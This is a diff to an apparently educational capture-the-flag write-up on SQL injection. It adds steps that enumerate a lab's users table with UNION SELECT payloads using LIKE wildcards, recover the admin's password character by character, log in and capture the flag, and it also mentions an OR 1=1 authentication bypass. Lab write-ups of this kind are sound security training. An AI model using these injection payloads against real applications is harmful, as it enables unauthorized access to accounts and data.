@@ -109,7 +109,7 @@ Entered payload
 - `OR 1=1` always evaluates to true (returning a row)
 - `;--` ends the statements and comments everything after it (password)
 
-
+#### **Capture Flag**
 
 ![Auth-Bypass](Images/sqli2-authbypass.jpeg)
 
@@ -174,6 +174,44 @@ Confirmed column `password` exists
 
 ![pass-column](Images/sqli3-passcolumn.jpeg)
 
+
+#### Extract Username and Password 
+
+Repeated enumeration process for username
+
+```SQL
+admin123' UNION SELECT 1,2,3 from users where username like '%';--
+```
+Found `admin` username exists 
+![usr-enum](Images/sqli-usrconfirm.jpeg)
+
+Repeated process again for password 
+
+```SQL
+admin123' UNION SELECT 1,2,3 from users where username='admin' and password like '%';--
+```
+
+Found admin password began with 3 
+
+![pass-enum](Images/sqli3-passenum.jpeg)
+
+Experimented with different combinations until confirmation 
+
+![Full-Credentials](Images/sqli3-fullcreds.jpeg)
+
+**Confirmed full credentials**
+- username: admin
+- password: 3845
+
+#### Authentication & Flag Capture
+
+Successfully authenticated using the recovered credentials
+
+![Loggin-In](Images/sqli3-entercreds.jpeg)
+
+#### **Capture Flag**
+
+![Flag-Capture](Images/sqli3-flag.jpeg)
 
 
 
